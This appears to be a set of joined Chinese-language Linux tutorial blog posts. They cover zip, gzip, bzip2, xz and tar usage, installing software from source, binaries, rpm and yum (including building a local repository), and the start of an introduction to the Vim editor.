在无法使用 gzip 或 tar 的情况下可以提供压缩和解压缩的一个不错的选择,这或许是在Linux 、微软 Windows 和 Mac OS 用户之间交换压缩文件的一种最好的形式。有许多不错的 zip 程序(有开放源码的,也有商业的)可用于这些操作系统,它们应该能确保文件的顺利交换(当然,只要是在特定于某个特定工具的特殊功能关闭的情况下)。 rhel7 默认带有 info-zip 软件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[root@mastera0 zip-3.0]# which zip/usr/bin/zip[root@mastera0 zip-3.0]# rpm -qf /usr/bin/zipzip-3.0-10.el7.x86_64[root@mastera0 zip-3.0]# head -n 18 /usr/share/doc/zip-3.0/READMEZip 3.0 is the first Zip update adding large file support. For now Zip 2.3xremains available and supported, but users should switch to this new release.Testing for Zip 3.0 has focused mainly on Unix, VMS, Max OS X, and Win32,and some other ports may not be fully supported yet. If you find yourfavorite port is broke, send us the details or, better, send bug fixes. It&apos;spossible that support for some older ports may be dropped in the future.Copyright (c) 1990-2008 Info-ZIP. All rights reserved.See the accompanying file LICENSE (the contents of which are also includedin unzip.h, zip.h and wiz.h) for terms of use. If, for some reason, allof these files are missing, the Info-ZIP license also may be found at:ftp://ftp.info-zip.org/pub/infozip/license.html andhttp://www.info-zip.org/pub/infozip/license.html.[root@mastera0 ~]# rpm -qi zipName: zipVersion : 3.0Release : 10.el7Architecture: x86_64Install Date: Thu 23 Jun 2016 01:50:41 PM CSTGroup: Applications/ArchivingSize: 815045License : BSDSignature : RSA/SHA256, Thu 03 Apr 2014 06:52:17 AM CST, Key ID 199e2f91fd431d51Source RPM : zip-3.0-10.el7.src.rpmBuild Date : Tue 28 Jan 2014 06:35:49 AM CSTBuild Host : x86-019.build.eng.bos.redhat.comRelocations : (not relocatable)Packager : Red Hat, Inc. &lt;http://bugzilla.redhat.com/bugzilla&gt;Vendor: Red Hat, Inc.URL: http://www.info-zip.org/Zip.htmlSummary : A file compression and packaging utility compatible with PKZIPDescription :The zip program is a compression and file packaging utility. Zip isanalogous to a combination of the UNIX tar and compress commands andis compatible with PKZIP (a compression and file packaging utility forMS-DOS systems).Install the zip package if you need to compress files using the zipprogram. zip 命令用法zip 命令可以用来解压缩文件,或者对文件进行打包操作。 zip 是个使用广泛的压缩程序,文件经它压缩后会另外产生具有 “ .zip” 扩展名的压缩文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445语法 zip( 选项 )( 参数 )选项-A :调整可执行的自动解压缩文件;-b&lt; 工作目录 &gt; :指定暂时存放文件的目录;-c :替每个被压缩的文件加上注释;-d :从压缩文件内删除指定的文件;-D :压缩文件内不建立目录名称;-f :此参数的效果和指定 “ -u” 参数类似,但不仅更新既有文件,如果某些文件原本不存在于压缩文件内,使用本参数会一并将其加入压缩文件中;-F :尝试修复已损坏的压缩文件;-g :将文件压缩后附加在已有的压缩文件之后,而非另行建立新的压缩文件;-h :在线帮助;-i&lt; 范本样式 &gt; :只压缩符合条件的文件;-j :只保存文件名称及其内容,而不存放任何目录名称;-J :删除压缩文件前面不必要的数据;-k :使用 MS-DOS 兼容格式的文件名称;-l :压缩文件时,把 LF 字符置换成 LF+CR 字符;-ll :压缩文件时,把 LF+cp 字符置换成 LF 字符;-L :显示版权信息;-m :将文件压缩并加入压缩文件后,删除原始文件,即把文件移到压缩文件中;-n&lt; 字尾字符串 &gt; :不压缩具有特定字尾字符串的文件;-o :以压缩文件内拥有最新更改时间的文件为准,将压缩文件的更改时间设成和该文件相同;-q :不显示指令执行过程;-r :递归处理,将指定目录下的所有文件和子目录一并处理;-S :包含系统和隐藏文件;-t&lt; 日期时间 &gt; :把压缩文件的日期设成指定的日期;-T :检查备份文件内的每个文件是否正确无误;-u :更换较新的文件到压缩文件内;-v :显示指令执行过程或显示版本信息;-V :保存 VMS 操作系统的文件属性;-w :在文件名称里假如版本编号,本参数仅在 VMS 操作系统下有效;-x&lt; 范本样式 &gt; :压缩时排除符合条件的文件;-X :不保存额外的文件属性;-y :直接保存符号连接,而非该链接所指向的文件,本参数仅在 UNIX 之类的系统下有效;-z :替压缩文件加上注释;-$ :保存第一个被压缩文件所在磁盘的卷册名称;-&lt; 压缩效率 &gt; :压缩效率是一个介于 1~9 的数值。参数zip 压缩包:指定要创建的 zip 压缩包;文件列表:指定要压缩的文件列表。实例zip -q -r html.zip /home/Blinux/htmlzip -q -r html.zip * unzip 的用法unzip 命令用于解压缩由 zip 命令压缩的 “ .zip” 压缩包 123456789101112131415161718192021222324252627282930313233343536语法 unzip( 选项 )( 参数 )选项-c :将解压缩的结果显示到屏幕上,并对字符做适当的转换;-f :更新现有的文件;-l :显示压缩文件内所包含的文件;-p :与 -c 参数类似,会将解压缩的结果显示到屏幕上,但不会执行任何的转换;-t :检查压缩文件是否正确;-u :与 -f 参数类似,但是除了更新现有的文件外,也会将压缩文件中的其他文件解压缩到目录中;-v :执行时显示详细的信息;-z :仅显示压缩文件的备注文字;-a :对文本文件进行必要的字符转换;-b :不要对文本文件进行字符转换;-C :压缩文件中的文件名称区分大小写;-j :不处理压缩文件中原有的目录路径;-L :将压缩文件中的全部文件名改为小写;-M :将输出结果送到 more 程序处理;-n :解压缩时不要覆盖原有的文件;-o :不必先询问用户, unzip 执行后覆盖原有的文件;-P&lt; 密码 &gt; :使用 zip 的密码选项;-q :执行时不显示任何信息;-s :将文件名中的空白字符转换为底线字符;-V :保留 VMS 的文件版本信息;-X :解压缩时同时回存文件原来的 UID/GID ;-d&lt; 目录 &gt; :指定文件解压缩后所要存储的目录;-x&lt; 文件 &gt; :指定不要处理 .zip 压缩文件中的哪些文件;-Z : unzip-Z 等于执行 zipinfo 指令参数 压缩包:指定要解压的 “ .zip” 压缩包。实例unzip test.zipunzip -v test.zipunzip -n test.zip -d /tmp .gzgzip 的用法gzip 命令用来压缩文件。 gzip 是个使用广泛的压缩程序,文件经它压缩过后,其名称后面会多处 “ .gz”扩展名。 gzip 是在 Linux 系统中经常使用的一个对文件进行压缩和解压缩的命令,既方便又好用。 gzip 不仅可以用来压缩大的、较少使用的文件以节省磁盘空间,还可以和 tar 命令一起构成 Linux 操作系统中比较流行的压缩文件格式。据统计, gzip 命令对文本文件有 60% ~ 70% 的压缩率。减少文件大小有两个明显的好处,一是可以减少存储空间,二是通过网络传输文件时,可以减少传输的时间。 12345678910111213141516171819202122232425262728293031语法 gzip( 选项 )( 参数 )选项-a 或 —— ascii :使用 ASCII 文字模式;-d 或 --decompress 或 ----uncompress :解开压缩文件;-f 或 —— force :强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接;-h 或 —— help :在线帮助;-l 或 —— list :列出压缩文件的相关信息;-L 或 —— license :显示版本与版权信息;-n 或 --no-name :压缩文件时,不保存原来的文件名称及时间戳记;-N 或 —— name :压缩文件时,保存原来的文件名称及时间戳记;-q 或 —— quiet :不显示警告信息;-r 或 —— recursive :递归处理,将指定目录下的所有文件及子目录一并处理;-S 或 &lt; 压缩字尾字符串 &gt; 或 ----suffix&lt; 压缩字尾字符串 &gt; :更改压缩字尾字符串;-t 或 —— test :测试压缩文件是否正确无误;-v 或 —— verbose :显示指令执行过程;-V 或 —— version :显示版本信息;-&lt; 压缩效率 &gt; :压缩效率是一个介于 1~9 的数值,预设值为 “ 6” ,指定愈大的数值,压缩效率就会愈高;--best :此参数的效果和指定 “ -9” 参数相同;--fast :此参数的效果和指定 “ -1” 参数相同。参数 文件列表:指定要压缩的文件或指定要解压的文件。。实例gzip * 将当前目录下的每个文件都压缩成 .gz 文件gzip test 将 test 文件压缩成 test.gz 文件并删除源文件gzip -rv /tmp 第归压缩目录中的所有文件,压缩成 .gz 结尾的文件,并显示指令执行过程gizp -dr /tmp 第归解压 /tmp 目录下的 .gz 结尾的文件 gunzip 的用法gunzip 命令用来解压缩文件。 gunzip 是个使用广泛的解压缩程序,它用于解开被 gzip 压缩过的文件,这些压缩文件预设最后的扩展名为 .gz 。其实压缩或解压缩,都可通过 gzip 指令单独完成。 1234567891011121314151617181920212223242526语法 gunzip( 选项 )( 参数 )选项-a 或 —— ascii :使用 ASCII 文字模式;-c 或 --stdout 或 --to-stdout :把解压后的文件输出到标准输出设备;-f 或 -force :强行解开压缩文件,不理会文件名称或硬连接是否存在以及该文件是否为符号连接;-h 或 —— help :在线帮助;-l 或 —— list :列出压缩文件的相关信息;-L 或 —— license :显示版本与版权信息;-n 或 --no-name :解压缩时,若压缩文件内含有原来的文件名称及时间戳记,则将其忽略不予处理;-N 或 —— name :解压缩时,若压缩文件内含有原来的文件名称及时间戳记,则将其回存到解开的文件上;-q 或 —— quiet :不显示警告信息;-r 或 —— recursive :递归处理,将指定目录下的所有文件及子目录一并处理;-S 或 &lt; 压缩字尾字符串 &gt; 或 ----suffix&lt; 压缩字尾字符串 &gt; :更改压缩字尾字符串;-t 或 —— test :测试压缩文件是否正确无误;-v 或 —— verbose :显示指令执行过程;-V 或 —— version :显示版本信息;参数 文件列表:指定要解压的压缩包。实例gzip -d test.gzgunzip test.gz效果一样 .bz2bzip2 的用法bzip2 命令用于创建和管理(包括解压缩) “ .bz2” 格式的压缩包。 1234567891011121314151617181920212223242526语法 bzip2( 选项 )( 参数 )选项-c 或 —— stdout :将压缩与解压缩的结果送到标准输出;-d 或 —— decompress :执行解压缩;-f 或 -force : bzip2 在压缩或解压缩时,若输出文件与现有文件同名,预设不会覆盖现有文件。若要覆盖。请使用此参数;-h 或 —— help :在线帮助;-k 或 —— keep : bzip2 在压缩或解压缩后,会删除原始文件。若要保留原始文件,请使用此参数;-s 或 —— small :降低程序执行时内存的使用量;-t 或 —— test :测试 .bz2 压缩文件的完整性;-v 或 —— verbose :压缩或解压缩文件时,显示详细的信息;-z 或 —— compress :强制执行压缩;-V 或 —— version :显示版本信息;--repetitive-best :若文件中有重复出现的资料时,可利用此参数提高压缩效果;--repetitive-fast :若文件中有重复出现的资料时,可利用此参数加快执行效果。参数 文件列表:指定要压缩的文件或指定要解压的文件。实例bzip2 test 压缩 test 文件,生成压缩文件 test.bz2 ,并删除源文件bzip2 -k test 压缩 test 文件,生成压缩文件 test.bz2 ,并保留源文件bzip2 -d test.bz2 解压文件bunzip2 test.bz2 解压文件 bunzip2 的用法bunzip2 命令解压缩由 bzip2 指令创建的 ” .bz2” 压缩包。对文件进行压缩与解压缩。此命令类似于“ gzip/gunzip” 命令,只能对文件进行压缩。对于目录只能压缩目录下的所有文件,压缩完成后,在目录下生成以 “ .bz2” 为后缀的压缩包。 bunzip2 其实是 bzip2 的符号链接,即软链接,因此压缩解压都可以通过 bzip2 实现。 12345678910111213141516[root@mastera0 ~]# which bzip2/usr/bin/bzip2[root@mastera0 ~]# which bunzip2/usr/bin/bunzip2[root@mastera0 ~]# ll -i /usr/bin/bzip233853111 -rwxr-xr-x. 1 root root 36752 Jul 31 2014 /usr/bin/bzip2[root@mastera0 ~]# ll -i /usr/bin/bunzip234293684 lrwxrwxrwx. 1 root root 5 Jun 23 13:50 /usr/bin/bunzip2 -&gt; bzip2bunzip2 [ -fkvsVL ] [ filenames ... ]-f 或 --force :解压缩时,若输出的文件与现有文件同名时,预设不会覆盖现有的文件;-k 或 --keep :在解压缩后,预设会删除原来的压缩文件。若要保留压缩文件,请使用此参数;-s 或 --small :降低程序执行时,内存的使用量;-v 或 --verbose :解压缩文件时,显示详细的信息;-l , --license , -V 或 —— version :显示版本信息。 .xzXZ Utils 是为 POSIX 平台开发具有高压缩率的工具。它使用 LZMA2 压缩算法,生成的压缩文件比POSIX 平台传统使用的 gzip、bzip2 生成的压缩文件更小,而且解压缩速度也很快。最初 XZ Utils的是基于 LZMA-SDK 开发,但是 LZMA-SDK 包含了一些 WINDOWS 平台的特性,所以 XZ Utils 为以适应 POSIX 平台作了大幅的修改。XZ Utils 的出现也是为了取代 POSIX 系统中旧的 LZMA Utils。XZ Utils 主要包含了下列部分: 命令行程序 xz ,用来生成和解压缩 .xz 压缩文件。 一组实用的脚本工具 (xzcat, xdiff, xzgrep 等)提供浏览,查找以及比较 .xz 文件内容等功能。 liblzma 压缩库,提供算法的实现和近似于 ZLIB 的编程接口。 提供对 LZMA Utils 的一些兼容 xz 文件格式 XZ Utils 工具生成的压缩文件扩展名为 .xz (MIME 类型为”application/x-xz”)。 .xz 文件格式具有下列特点: 基于数据流: 易于通过管道 (pipe) 生成压缩文件或解压缩文件。.xz 文件格式与 .gz/.bz2 文件一样,不具备对多个文件进行归档打包的能力。若要处理多个文件,可以和归档工具 tar 结合使用,生成扩展名为 .tar.xz 或 .txz 的压缩文件。 随机读取: 存储的数据被划分为独立的压缩块,并对每个压缩块进行索引,当每个压缩块比较小时,便能够进行有限的随机读取压缩数据。 完整性验证: 可以使用 CRC32、CRC64、SHA-256 来进行数据的完整性验证,也可以增加自定义验证方法。 可连接(concatenation): 类似于 .gz/.bz2 文件,可以把多个压缩数据流连接到一个文件中。解压缩时,就像解压一个正常单压缩流文件一样。 支持多 filter 和 filter 链: 提供自定义 filter 的能力,也能够将多个 filter 组成filter 链,对数据进行处理。这点与 Unix 命令间使用的管道 (pipe) 类似。 可填充(padding): 可以在 .xz 文件末尾填充二进制’0’以充满特定大小的空间,比如备份磁带上的一个块 (block)。 XZ Utils 具有高压缩率,解压速度快的特点。能够生成更小文件的同时,也能提供稳定快速的解压,在对数据大小比较敏感的场合,比如说大数据的网络传输,文件的备份,处理能力有限的嵌入系统等场合,有着十分广泛的用途。 xz 命令用法123456789101112131415161718192021222324252627282930313233343536语法 xz ( 选项 )( 参数 )选项-z, --compressforce compression 强制压缩-d, --decompress, --uncompressforce decompression 解开压缩文件-t, --test test compressed file integrity 测试压缩文件是否正确无误-l, --list list information about .xz files 列出压缩文件的相关信息-k, --keep keep (don&apos;t delete) input files 不删除源文件-f, --force force overwrite of output file and (de)compress links 强制压缩,覆盖输出文件同名的文件-c, --stdout, --to-stdout write to standard output and don&apos;t delete input files 写入标准输出,不要删除输入文件-0 ... -9 compression preset; default is 6; take compressor *and* decompressor memory usage into account before using 7-9! 压缩效率是一个介于1~9 的数值,预设值为 “ 6” ,指定愈大的数值,压缩效率就会愈高;解压由县考虑使用 7-9-e, --extreme try to improve compression ratio by using more CPU time; does not affect decompressor memory requirements 通过使用更多的处理器时间来提高压缩比;不影响解压时的内存需求-T, --threads=NUM use at most NUM threads; the default is 1; set to 0 to use the number of processor cores 最多使用的线程数量,默认为 1 ,如果设置为0 去使用处理器内核的数量-q, --quiet suppress warnings; specify twice to suppress errors too 抑制警告;指定两次以抑制错误-v, --verbose be verbose; specify twice for even more verbose-h, --help display this short help and exit-H, --long-help display the long help (lists also the advanced options)-V, --version display the version number and exit参数 文件列表:指定要压缩的文件列表。实例xz test 压缩一个文件 test ,压缩成功后删除源文件xz -d -k test.xz 解压 test.xz 文件, -k 参数保证源文件不被删除xz -l test.xz 查看基本信息,包括压缩率等xz -k7 test 使用参数 -0, -1, -2, ... -6, ... -9 或参数 --fast, --best 设定压缩率。 xz 命令的默认为-6 。借助 xargs 命令并行压缩多文件。下面的命令行可以将 /var/log 目录下所有的扩展名为 .log 的文件压缩。通过 xargs 命令同时运行多个 xz 进行压缩。find /var/log -type f -iname &quot;*.log&quot; -print0 | xargs -P4 -n16 xz -T1注意:运行此命令须有 root 权限。 tartar 命令可以为 linux 的文件和目录创建档案。利用 tar ,可以为某一特定文件创建档案(备份文件),也可以在档案中改变文件,或者向档案中加入新的文件。 tar 最初被用来在磁带上创建档案,现在,用户可以在任何设备上创建档案。利用 tar 命令,可以把一大堆的文件和目录全部打包成一个文件,这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。 首先要弄清两个概念:打包和压缩。 打包是指将一大堆文件或目录变成一个总的文件; 压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 为什么要区分这两个概念呢? 这源于 Linux 中很多压缩程序只能针对一个文件进行压缩,这样当你想要压缩一大堆文件时,你得先将这一大堆文件先打成一个包( tar 命令),然后再用压缩程序进行压缩( gzip bzip2 命令)。 12345678910111213141516171819202122232425262728293031323334353637语法 tar ( 选项 )( 参数 )选项-A 或 --catenate :新增文件到以存在的备份文件;-B :设置区块大小;-c 或 --create :建立新的备份文件;-C &lt; 目录 &gt; :这个选项用在解压缩,若要在特定目录解压缩,可以使用这个选项。-d :记录文件的差别;-x 或 --extract 或 --get :从备份文件中还原文件;-t 或 --list :列出备份文件的内容;-z 或 --gzip 或 --ungzip :通过 gzip 指令处理备份文件;-Z 或 --compress 或 --uncompress :通过 compress 指令处理备份文件;-f&lt; 备份文件 &gt; 或 --file=&lt; 备份文件 &gt; :指定备份文件;-v 或 --verbose :显示指令执行过程;-r :添加文件到已经压缩的文件;-u :添加改变了和现有的文件到已经存在的压缩文件;-j :支持 bzip2 解压文件;-J :支持 xz 解压文件;-v :显示操作过程;-l :文件系统边界设置;-k :保留原有文件不覆盖;-m :保留文件不被覆盖;-w :确认压缩文件的正确性;-p 或 --same-permissions :用原来的文件权限还原文件;-P 或 --absolute-names :文件名使用绝对名称,不移除文件名称前的 “ /” 号;-N &lt; 日期格式 &gt; 或 --newer=&lt; 日期时间 &gt; :只将较指定日期更新的文件保存到备份文件里;--exclude=&lt; 范本样式 &gt; :排除符合范本样式的文件。参数 文件列表:指定要打包的文件或目录列表。实例tar -cvf log.tar log2012.log 仅打包,不压缩! tar -xf 解压tar -zcvf log.tar.gz log2012.log 打包后,以 gzip 压缩 tar -zxf 解压tar -jcvf log.tar.bz2 log2012.log 打包后,以 bzip2 压缩 tar -jxf 解压tar -Jcvf log.tar.xz log2012.log 打包后,以 xz 压缩 tar -Jxf 解压tar -tf log.tar 查看打包文件注意 -f 参数后面必须接文件名 04-Linux压缩打包课后习题 通过dd创建4个5M的文件,分别为afile;bfile;cfile;dfile,并将这4个文件放在/tmp/test目录中保存 对这4个相同大小的文件进行压缩,分别使用zip;bzip2;gzip;xz,并观察 在将压缩文件进行解压,并观察 将/tmp/test目录进行打包,分别使用gzip和bzip2压缩","link":"/2016/12/22/booboo_linux_base/04-Linux-tar/"},{"title":"Linux 软件安装","text":"源代码安装 优势 : 可定制，紧跟发布，及时修正Bug 缺点 : 操作复杂 , 编译时间长 , 极易出现错误，大面积部署复杂且低效，安全性隐患大 源代码安装步骤 下载解压,阅读软件包附带的 install 文件和 readme 文件,获取软件的相关信息。 进入解包之后的目录,执行 “ ./configure” 命令，使用参数设置编译环境和编译模块，例如--prefix为编译做好关于本地环境的配置。 配置成功后,执行 “ make” 命令进行软件编译。 编译成功后,执行 “ make install” 命令完成安装。 最后,执行 “ make clean” 命令删除安装时产生的临时文件 卸载步骤 先进入软件的安装目录,然后执行卸载命令即可:make uninstall 如果有的软件包不提供 uninstall 功能,则必须进行手动删除。因此你需要阅读安装目录里面的readme 文件,或者在安装的过程中指定安装目录,即在 ./configure 命令后面添加参数 –prefix ,例如:./configure --prefix=/usr/local/dir 该命令将把软件安装在 /usr/local/ 路径的 dir 目录里。通常情况下,大多数软件都默认安装在 /usr/local 目录里。 MPlayer源码安装实验 下载软件包到系统某个目录下，本次演示中使用/tmp/mplayer/目录，软件包包括主程序、库函数、皮肤 1234wget ....all-20071007.tar.bz2 库函数Blue-1.7.tar.bz2 皮肤MPlayer-1.0rc2.tar.bz2 主程序 将压缩包解压 1tar -jxf 创建目录用来存放库函数 mkdir /usr/local/lib/codes 将/tmp/mplayer/all/目录下所有文件复制到/usr/local/lib/codes 12cp all-20071007/* /usr/local/lib/codesll /usr/local/lib/codes 安装依赖包 yum install -y kernel-devel gcc zlib-devel gtk2-devel 检查安装环境 12cd /tmp/mplayer/MPlayer-1.0rc2./configure --enable-gui --codecsdir=/usr/local/lib/codes --enable-x11 --enable-xshape --language=zh_CN --disable-ivtv --disable-png 编译make make 安装 make install 装皮肤 1234这部分不是代码，而是程序装在了哪里 Install prefix: /usr/local Data directory: /usr/local/share/mplayer Config direct.: /usr/local/etc/mplayer 创建目录mkdir /usr/local/share/mplayer/skins/default/ 将皮肤文件复制到/usr/local/share/mplayer/default/目录中cp /tmp/mplayer/Blue/* /usr/local/share/mplayer/skins/default/ 从真机桌面用鼠标双击打开图形化界面的rhel6，去测试，是否安装成功。 applications---&gt;sound&amp;video----&gt;mplayer 二进制安装直接解压缩即可使用 例如 mycat 数据库代理服务器安装 mycat ,直接解压缩即可使用 1234567tar xf Mycat-server-1.5.1-RELEASE-20160328130228-linux.tar.gz -C /usr/localcd /usr/local;lscd mycat;llchmod 755 * -Rvim conf/schema.xmlvim conf/server.xmlbin/mycat start RPMRPM : redhat package management rpm 命令是 RPM 软件包的管理工具。 rpm 原本是 Red Hat Linux 发行版专门用来管理 Linux 各项套件的程序,由于它遵循 GPL 规则且功能强大方便,因而广受欢迎。逐渐受到其他发行版的采用。 RPM 套件管理方式的出现,让 Linux 易于安装,升级,间接提升了 Linux 的适用度。 rpm 的命名规范 : 软件名 - 版本号 - 操作系统平台 libreoffice4.1-calc-4.1.6.2-1.x86_64.rpm zlib-1.2.3-29.el6.x86_64.rpm 123456789101112131415161718192021222324252627282930313233343536373839语法 rpm ( 选项 )( 参数 )选项-a :查询所有套件;-b&lt; 完成阶段 &gt;&lt; 套件档 &gt;+ 或 -t &lt; 完成阶段 &gt;&lt; 套件档 &gt;+ :设置包装套件的完成阶段,并指定套件档的文件名称;-c :只列出组态配置文件,本参数需配合 &quot;-l&quot; 参数使用;-d :只列出文本文件,本参数需配合 &quot;-l&quot; 参数使用;-e&lt; 套件档 &gt; 或 --erase&lt; 套件档 &gt; :删除指定的套件;-f&lt; 文件 &gt;+ :查询拥有指定文件的套件;-h 或 --hash :套件安装时列出标记;-i :显示套件的相关信息;-i&lt; 套件档 &gt; 或 --install&lt; 套件档 &gt; :安装指定的套件档;-l :显示套件的文件列表;-p&lt; 套件档 &gt;+ :查询指定的 RPM 套件档;-q :使用询问模式,当遇到任何问题时, rpm 指令会先询问用户;-R :显示套件的关联性信息;-s :显示文件状态,本参数需配合 &quot;-l&quot; 参数使用;-U&lt; 套件档 &gt; 或 --upgrade&lt; 套件档 &gt; :升级指定的套件档;-v :显示指令执行过程;-vv :详细显示指令执行过程,便于排错。参数 软件包:指定要操纵的 rpm 软件包。实例install 安装1)rpm -ivh [x.rpm] 安装 v\\h 显示安装过程中的进度条 verbose\\hashquery 查询2)rpm -q [ 软件名称 ] 查看软件是否安装3)rpm -qi [ 软件名称 ] 查看软件的详细信息4)rpm -ql [ 软件名称 ] 查看软件在系统中安装过的文件5)rpm -qf [ 文件名称 ] 查看文件是由哪个软件包安装出来的6)rpm -qa 查看系统里所有已经安装过的软件包卸载 remove6)rpm -e [ 软件名称 ] 卸载软件rpm -e --nodeps 不卸载依赖关系update 升级7)rpm -U [ 软件名称 ] 升级 , 若没有该软件则安装8)rpm -F [ 软件名称 ] 升级 , 若没有该软件则不安装 YUMyum 的作用作用 : 为了解决包之间的依赖关系而存在的一种管理机制 , 基于 rpm 为前端的包管理机制 .为了解决依赖关系 , 引入了一种仓库的机制 . yum 仓库仓库 : 用来存放软件和软件之间的依赖关系 , 当我们需要安装软件的时候 , 就可以通过该依赖关系 , 来将相应的依赖包都装上 .repodata 目录就是 yum 的仓库 , 存放软件和软件之间的依赖关系数据 . 1234[root@rhel6 dvd]# ll repodata/ -ddr-xr-xr-x. 2 root root 4096 Nov 12[root@rhel6 dvd]#pwd/mnt/rhel6.5/x86_64/dvd 依赖关系安装系统的光盘中已经有建号的依赖关系了,即 repodata/ 目录,如果要自己手动制作 rpm 包依赖关系目录,该怎么做呢? 安装软件 createreporhel7 默认已经安装123456789101112[root@rhel7 ~]# yum install -y createrepoLoaded plugins: langpacks, product-id, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-managerto register.server| 4.1 kB 00:00:00(1/2): server/group_gz| 134 kB 00:00:00(2/2): server/primary_db| 3.4 MB 00:00:00Package createrepo-0.9.9-23.el7.noarch already installed and latest versionNothing to dorhel6 要自己安装 123456789101112131415161718192021222324[root@rhel6 rc.d]# yum install -y createrepoLoaded plugins: product-id, refresh-packagekit, security, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-managerto register.serverRunning TransactionInstalling : deltarpm-3.5-0.5.20090913git.el6.x86_641/3Installing : python-deltarpm-3.5-0.5.20090913git.el6.x86_642/3Installing : createrepo-0.9.9-18.el6.noarch3/3Verifying : createrepo-0.9.9-18.el6.noarch1/3Verifying : python-deltarpm-3.5-0.5.20090913git.el6.x86_642/3Verifying : deltarpm-3.5-0.5.20090913git.el6.x86_643/3Installed:createrepo.noarch 0:0.9.9-18.el6Dependency Installed:deltarpm.x86_64 0:3.5-0.5.20090913git.el6Complete!python-deltarpm.x86_64 0:3.5-0.5.20090913git.el64.3.2 制作 rpm 包依赖关系目录 以 rhel7 为例从学校服务器上拷贝一些软件到 /tmp/dvd7.1/ 目录下 12[root@rhel7 tmp]# cp /mnt/rhel7.1/x86_64/dvd/Packages/* /tmp/dvd7.1[root@rhel7 tmp]# cd /tmp/dvd7.1 制作 rpm 包依赖关系 12345678[root@rhel7 dvd7.1]# createrepo /tmp/dvd7.1/Spawning worker 0 with 4371 pkgsWorkers FinishedSaving Primary metadataSaving file lists metadataSaving other metadataGenerating sqlite DBsSqlite DBs complete 已经成功创建 12[root@rhel7 tmp]# ll dvd7.1/ |grep repodatadrwxr-xr-x. 2 root root 4096 Mar 18 07:42 repodata 配置仓库为此 , 我们需要优先去配置一个仓库指向文件。这个文件的位置在 /etc/yum.repos.d/ 目录下 , 以 .repo 结尾 123[root@rhel7 tmp]# cd /etc/yum.repos.d/[root@rhel7 yum.repos.d]# lsserver.repo 12345678910111213141516171819202122[ 仓库名 ]name = 说明信息baseurl = 指向 repodata 目录的上一级 .enable = 是否启用该仓库 0 代表不启用 ,1 代表启用gpgcheck = 是否需要检测其中 baseurl1. 本地路径 file:///content/rhel6.5..... 以下省略 第三个 / 代表的是根 .2. 远程路径 协议 :// 位置 例: http:// ftp:// nfs:// [server]name = rhel7.1 reposbaseurl = http://classroom.example.com/content/rhel6.5/x86_64/dvd/enable=1gpgcheck=0[test]name = infobaseurl=file:///tmp/dvd7.1/enable=1gpgcheck=0 配置完仓库后 , 需要使用 yum clean all 来清理缓存 yum makecache 来重新生成缓存 .4.5 yum 安装 安装 yum install 软件名 安装指定软件 yum groupinstall 组名 用来安装一系列的软件包 , yum reinstall 软件名 重新安装指定软件 -y 选项 , 忽略安装过程出现的 is this ok的交互信息 yum localinstall 软件名 本地安装指定软件 查询 yum list 用来查询所有的软件包 yum list installed 用来查看已经安装过的软件包 yum search 字符串 能够将说明信息里含该字符串的相关软件包罗列出来 yum info 软件包名 用来查看软件包的详细信息 yum grouplist 组名 用来查询系统里所有的组包 yum groupinfo 组名 用来查询指定组的相关信息 升级 yum update 软件名 yum upgrade 软件名 两种写法执行效果没有区别 卸载 yum remove 软件名 不要使用 yum 去卸载 , 会将软件的依赖关系一并卸载掉 . Linux 软件安装课后作业 配置一个 yum 仓库。熟悉一下配置的几个字段内容。 安装 vsftpd 软件。 查看 vsftpd 软件的安装文件有哪些 查看一下 touch 命令是由哪个软件包安装出来的 搜索一下含 bind 字符串的软件包。 查询一下 httpd 软件有没有安装 , 没有则将该软件装上。 查看一下 httpd 软件的版本号及试用平台。 卸载 vsftpd 软件。 卸载 httpd 软件 , 不要卸载与其有依赖关系的软件包","link":"/2016/12/22/booboo_linux_base/05-Linux-software/"},{"title":"Linux Vim 编辑器","text":"Vim 简介 Vim 是 Linux 系统上的最著名的文本/ 代码编辑器,也是早年的 Vi编辑器的加强版，而 gVim 则是其 Windows 版。它的最大特色是完全使用键盘命令进行编辑，脱离了鼠标操作虽然使得入门变得困难,但上手之后键盘流的各种巧妙组合操作却能带来极为大幅的效率提升。 因此 Vim 和现代的编辑器(如 Sublime Text)有着非常巨大的差异,而且入门学习曲线陡峭,需要记住很多按键组合和命令,如今被看作是高手、Geek 们专用的编辑器。尽管 Vim 已经是古董级的软件,但还是有无数新人迎着困难去学习使用,可见其经典与受欢迎程度。 另外,由于 Vim 的可配置性非常强,各种插件、语法高亮配色方案等多不胜数,无论作为代码编辑器或是文稿撰写工具都非常给力！ 在 Linux 系统中配置应用服务,实际上就是在修改它的配置文件(配置文件可能有多个,其中包含不同的参数), 而且日常工作中也一定免不了编写文档的事情吧, 这些都是要通过文本编辑器来完成的。 在热门 Linux 操作系统中都会默认安装vim。 Vim - 难以驾驭的神器神器总是很难驾驭的,主角总得付出一些努力才能收获到更加强大的力量,对于 Vim 这种上古神器来说更是如此。由于它全程使用键盘操作,你必须记住一堆快捷键、按键组合以及各种命令才能开始使用,很多首次接触 Vim 的人会觉得越学越复杂而中途放弃。然而,坚持下来的朋友就会渐渐地发现这种键盘流操作的设计绝妙之处! 如果你是一位 IT 界人士,需要或将要与 Linux 系统打交道,那么学习好 Vim 的操作绝对能让你的工作轻松百倍!! 因为很多时候, Linux 作为服务器是不会开启图形界面,当需要远程操作时,你只能利用SSH“ 命令字符式 ” 的 Shell 界面对其进行操作,这时如果你需要修改服务器上的网页代码或配置文件,VI或 VIM 命令就是你最佳最方便也是最强大的伙伴了!相信我,学好 数理化 VIM ,走遍天下也不怕！ Vim 入门帮助 下面首先对 Vim 做一下最基本的介绍,并给出一些参考信息,以方便对 Vim 不熟悉的读者也能够理解并自己查阅进一步信息。 Vim 带有完整的帮助文档。 进入 Vim 后输入 “ :help”即可访问 新手在操作系统的命令行上输入 vimtutor 命令即可开始学习一个简单的 30 分钟的 Vim 教程2 Vim 命令 Vim 模式介绍 与大部分其它编辑器不同,进入 Vim 后,缺省状态下键入的字符并不会插入到所编辑的文件之中。Vim 的模式(mode ,可以简单地理解为 “ 状态 ” )概念非常重要。需要知道,Vim 有以下几个模式: 